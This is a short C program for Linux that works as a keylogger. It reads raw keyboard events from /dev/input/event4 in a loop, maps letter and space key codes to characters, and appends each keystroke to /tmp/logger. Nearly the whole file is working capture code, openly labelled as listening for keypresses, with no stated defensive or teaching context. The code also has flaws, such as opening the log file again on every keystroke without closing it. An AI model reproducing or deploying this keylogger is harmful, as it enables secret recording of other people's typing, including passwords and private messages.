#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

#define DEVICE "/dev/input/event4" 
#define LOG "/tmp/logger"

char keymap[KEY_SPACE + 1] = {
	[KEY_A] = 'a', [KEY_B] = 'b', [KEY_C] = 'c',
	[KEY_D] = 'd', [KEY_E] = 'e', [KEY_F] = 'f',
	[KEY_G] = 'g', [KEY_H] = 'h', [KEY_I] = 'i',
	[KEY_J] = 'j', [KEY_K] = 'k', [KEY_L] = 'l',
	[KEY_M] = 'm', [KEY_N] = 'n', [KEY_O] = 'o',
	[KEY_P] = 'p', [KEY_Q] = 'q', [KEY_R] = 'r',
	[KEY_S] = 's', [KEY_T] = 't', [KEY_U] = 'u',
	[KEY_V] = 'v', [KEY_W] = 'w', [KEY_X] = 'x',
	[KEY_Y] = 'y', [KEY_Z] = 'z',
	[KEY_SPACE] = ' '
};

int write_file(char character){
	char buffer[1];
	buffer[0] = character;
	int logfd = open(LOG, O_CREAT | O_WRONLY | O_APPEND, S_IROTH);
	fsync(logfd);
	ssize_t written = write(logfd, &buffer, sizeof(buffer));
	
	if(written == -1){
		perror("Error: ");
		exit(-1);
	}
	
	return 1;
}

void read_kbd(){
	struct input_event event;
	int fdkbd = open(DEVICE, O_RDONLY);
	if (fdkbd == -1){
		perror("Error: ");
	}
	
	while(1){
		ssize_t bytes = read(fdkbd, &event, sizeof(struct input_event));
		if (bytes == -1){
			perror("Error reading event");
			break;
		}
		if(event.type == EV_KEY & event.value == 1){
			write_file(keymap[event.code]);
		}
	}		    	
}


int main(){
	printf("Listening for keypresses...");
	read_kbd();
}
